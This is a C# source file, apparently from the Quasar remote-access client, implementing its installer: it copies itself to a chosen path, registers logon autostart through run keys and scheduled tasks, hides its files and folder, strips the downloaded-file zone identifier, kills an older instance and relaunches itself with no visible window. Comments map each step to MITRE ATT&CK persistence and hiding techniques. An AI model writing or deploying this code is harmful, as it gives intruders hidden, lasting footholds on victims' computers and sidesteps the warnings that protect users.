using Quasar.Client.Config;
using Quasar.Client.Extensions;
using Quasar.Common.Helpers;
using Quasar.Common.Logger;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientInstaller : ClientSetupBase
    {
        /// <summary>
        /// If enabled, sets client to start up on logon via schtasks and registry run keys, and hides installation files/directories.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
        /// - T1053.005: Scheduled Task/Job: Scheduled Task
        /// - T1564.001: Hide Artifacts: Hidden Files and Directories
        /// </remarks>
        public void ApplySettings()
        {
            if (Settings.STARTUP)
            {
                var clientStartup = new ClientStartup();
                clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
                Logger.Info(String.Format("Added client to startup using install path {0} and startup key {1}", Settings.INSTALLPATH, Settings.STARTUPKEY));
            }

            if (Settings.INSTALL && Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
                    Logger.Info(String.Format("Hid install path {0}", Settings.INSTALLPATH));
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                    Logger.Error(String.Format("Failed to hide install path {0}: {1}", Settings.INSTALLPATH, ex.ToString()));
                }
            }

            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
            {
                try
                {
                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
                    di.Attributes |= FileAttributes.Hidden;
                    Logger.Info(String.Format("Hid installation subdirectory {0}", di.FullName));
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                    Logger.Error(String.Format("Failed to hide installation subdirectory {0}: {1}", Settings.SUBDIRECTORY, ex.ToString()));
                }
            }
        }

        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
        /// - T1053.005: Scheduled Task/Job: Scheduled Task
        /// - T1564.001: Hide Artifacts: Hidden Files and Directories
        /// </remarks>
        public void Install()
        {
            // create target dir
            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
            {
                Logger.Debug("Creating installation directory " + Path.GetDirectoryName(Settings.INSTALLPATH));
                Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
            }

            // delete existing file
            if (File.Exists(Settings.INSTALLPATH))
            {
                try
                {
                    Logger.Debug("Deleting existing file at installation path " + Settings.INSTALLPATH);
                    File.Delete(Settings.INSTALLPATH);
                }
                catch (Exception ex)
                {
                    Logger.Error(String.Format("Failed to deleting existing file at installation path {0}: {1}", Settings.INSTALLPATH, ex.ToString()));
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        Logger.Debug("Killing process running at installation path.");

                        // kill old process running at destination path
                        Process[] foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            // dont kill own process
                            if (prc.Id == myPid) continue;
                            // only kill the process at the destination path
                            if (prc.GetMainModuleFileName() != Settings.INSTALLPATH) continue;
                            prc.Kill();
                            Thread.Sleep(2000);
                            break;
                        }
                    }
                }
            }

            File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
            Logger.Debug("Copied application executable to " + Settings.INSTALLPATH);

            ApplySettings();
            Logger.Debug("Applied settings.");

            FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);
            Logger.Debug("Deleted zone identifier for installation path " + Settings.INSTALLPATH);

            //start file
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = Settings.INSTALLPATH
            };
            Process.Start(startInfo);
            Logger.Debug("Started process at " + Settings.INSTALLPATH);
        }
    }
}
